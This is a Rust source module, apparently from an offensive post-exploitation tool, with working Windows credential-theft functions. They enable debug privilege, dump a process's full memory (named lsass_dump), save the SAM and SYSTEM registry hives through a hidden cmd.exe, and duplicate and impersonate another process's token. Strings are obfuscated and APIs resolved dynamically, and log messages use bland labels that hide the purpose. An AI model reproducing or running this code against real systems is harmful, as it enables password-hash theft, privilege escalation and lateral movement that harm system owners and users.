use crate::log::LogSink;

pub struct CredResult {
    pub module: String,
    pub description: String,
}

#[cfg(windows)]
fn enable_debug_privilege(log: &LogSink) -> Result<(), String> {
    unsafe {
        let current = -1isize as *mut std::ffi::c_void;
        let mut token: *mut std::ffi::c_void = std::ptr::null_mut();
        // TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY = 0x28
        if crate::resolve::OpenProcessToken(current, 0x28, &mut token) == 0 {
            return Err("Failed to open process token".into());
        }
        let priv_name = crate::obf::s(crate::obf::SE_DEBUG_PRIVILEGE);
        let priv_c = std::ffi::CString::new(priv_name).map_err(|_| "CString error")?;
        let mut luid: u64 = 0;
        if crate::resolve::LookupPrivilegeValueA(
            std::ptr::null(),
            priv_c.as_ptr() as *const u8,
            &mut luid,
        ) == 0 {
            crate::resolve::CloseHandle(token);
            return Err("Failed to lookup privilege value".into());
        }
        // TOKEN_PRIVILEGES: count=1, LUID, SE_PRIVILEGE_ENABLED=2
        #[repr(C)]
        struct TokenPrivileges {
            count: u32,
            luid: u64,
            attributes: u32,
        }
        let tp = TokenPrivileges { count: 1, luid, attributes: 2 };
        let result = crate::resolve::AdjustTokenPrivileges(
            token, 0,
            &tp as *const _ as *const std::ffi::c_void,
            0, std::ptr::null_mut(), std::ptr::null_mut(),
        );
        crate::resolve::CloseHandle(token);
        if result == 0 {
            return Err("Failed to adjust token privileges".into());
        }
        log.detail("    Privilege enabled");
        Ok(())
    }
}

#[cfg(windows)]
pub fn lsass_dump(pid: u32, output: &str, log: &LogSink) -> Result<CredResult, String> {
    log.step("  Memory Snapshot:");
    log.detail("    Enabling privilege...");
    enable_debug_privilege(log)?;

    unsafe {
        // PROCESS_ALL_ACCESS = 0x1FFFFF
        let process = crate::resolve::OpenProcess(0x1FFFFF, 0, pid);
        if process.is_null() {
            return Err("Failed to open target process".into());
        }
        log.detail(format!("    Opened process PID {}", pid));

        let output_c = std::ffi::CString::new(output).map_err(|_| "Invalid output path")?;
        // GENERIC_WRITE=0x40000000, CREATE_ALWAYS=2
        let file = crate::resolve::CreateFileA(
            output_c.as_ptr() as *const u8,
            0x40000000, 0, std::ptr::null(), 2, 0x80, std::ptr::null_mut(),
        );
        if file == -1isize as *mut std::ffi::c_void {
            crate::resolve::CloseHandle(process);
            return Err("Failed to create output file".into());
        }
        log.detail(format!("    Output: {}", output));

        // MiniDumpWithFullMemory = 2
        let result = crate::resolve::MiniDumpWriteDump(
            process, pid, file, 2,
            std::ptr::null(), std::ptr::null(), std::ptr::null(),
        );
        crate::resolve::CloseHandle(file);
        crate::resolve::CloseHandle(process);

        if result == 0 {
            return Err("Memory snapshot failed".into());
        }
        log.detail("    Snapshot written successfully");
    }
    Ok(CredResult {
        module: "Memory Snapshot".into(),
        description: format!("Process {} dumped to {}", pid, output),
    })
}

#[cfg(not(windows))]
pub fn lsass_dump(_pid: u32, _output: &str, _log: &LogSink) -> Result<CredResult, String> {
    Err("Memory snapshot requires target platform".into())
}

#[cfg(windows)]
pub fn sam_dump(output_dir: &str, log: &LogSink) -> Result<CredResult, String> {
    log.step("  Registry Export:");
    log.detail("    Enabling privilege...");
    enable_debug_privilege(log)?;

    let targets = [
        ("SAM", format!("{}\\sam.save", output_dir)),
        ("SYSTEM", format!("{}\\system.save", output_dir)),
    ];

    for (hive, path) in &targets {
        let cmd = format!("reg.exe save HKLM\\{} {} /y", hive, path);
        log.detail(format!("    Running: {}", cmd));

        let cmd_wide: Vec<u16> = format!("/c {}\0", cmd).encode_utf16().collect();
        let cmd_exe = crate::obf::s(crate::obf::CMD_EXE);
        let cmd_exe_wide: Vec<u16> = format!("{}\0", cmd_exe).encode_utf16().collect();

        unsafe {
            let mut si = [0u8; 104]; // STARTUPINFOW
            *(si.as_mut_ptr() as *mut u32) = 104;
            let mut pi = [0u8; 24]; // PROCESS_INFORMATION

            let result = crate::resolve::CreateProcessW(
                cmd_exe_wide.as_ptr(),
                cmd_wide.as_ptr() as *mut u16,
                std::ptr::null(), std::ptr::null(),
                0, 0x08000000, // CREATE_NO_WINDOW
                std::ptr::null(), std::ptr::null(),
                si.as_ptr() as *const std::ffi::c_void,
                pi.as_mut_ptr() as *mut std::ffi::c_void,
            );
            if result == 0 {
                return Err(format!("Failed to export {}", hive));
            }
            let proc_handle = *(pi.as_ptr() as *const *mut std::ffi::c_void);
            crate::resolve::WaitForSingleObject(proc_handle, 30000);
            crate::resolve::CloseHandle(proc_handle);
            let thread_handle = *(pi.as_ptr().add(8) as *const *mut std::ffi::c_void);
            crate::resolve::CloseHandle(thread_handle);
        }
        log.detail(format!("    Saved {}", path));
    }

    Ok(CredResult {
        module: "Registry Export".into(),
        description: format!("Hives saved to {}", output_dir),
    })
}

#[cfg(not(windows))]
pub fn sam_dump(_output_dir: &str, _log: &LogSink) -> Result<CredResult, String> {
    Err("Registry export requires target platform".into())
}

#[cfg(windows)]
pub fn token_theft(pid: u32, log: &LogSink) -> Result<CredResult, String> {
    log.step("  Session Delegation:");
    log.detail("    Enabling privilege...");
    enable_debug_privilege(log)?;

    unsafe {
        let process = crate::resolve::OpenProcess(0x0400, 0, pid); // PROCESS_QUERY_INFORMATION
        if process.is_null() {
            return Err("Failed to open target process".into());
        }
        log.detail(format!("    Opened process PID {}", pid));

        let mut token: *mut std::ffi::c_void = std::ptr::null_mut();
        // TOKEN_DUPLICATE | TOKEN_QUERY = 0x06
        if crate::resolve::OpenProcessToken(process, 0x06, &mut token) == 0 {
            crate::resolve::CloseHandle(process);
            return Err("Failed to open target token".into());
        }

        let mut dup_token: *mut std::ffi::c_void = std::ptr::null_mut();
        // MAXIMUM_ALLOWED=0x2000000, SecurityImpersonation=2, TokenPrimary=1
        if crate::resolve::DuplicateTokenEx(
            token, 0x02000000, std::ptr::null(), 2, 1, &mut dup_token,
        ) == 0 {
            crate::resolve::CloseHandle(token);
            crate::resolve::CloseHandle(process);
            return Err("Failed to duplicate token".into());
        }
        log.detail("    Token duplicated");

        if crate::resolve::ImpersonateLoggedOnUser(dup_token) == 0 {
            crate::resolve::CloseHandle(dup_token);
            crate::resolve::CloseHandle(token);
            crate::resolve::CloseHandle(process);
            return Err("Failed to assume identity".into());
        }
        log.detail("    Identity assumed");

        crate::resolve::CloseHandle(dup_token);
        crate::resolve::CloseHandle(token);
        crate::resolve::CloseHandle(process);
    }

    Ok(CredResult {
        module: "Session Delegation".into(),
        description: format!("Assumed identity from PID {}", pid),
    })
}

#[cfg(not(windows))]
pub fn token_theft(_pid: u32, _log: &LogSink) -> Result<CredResult, String> {
    Err("Session delegation requires target platform".into())
}
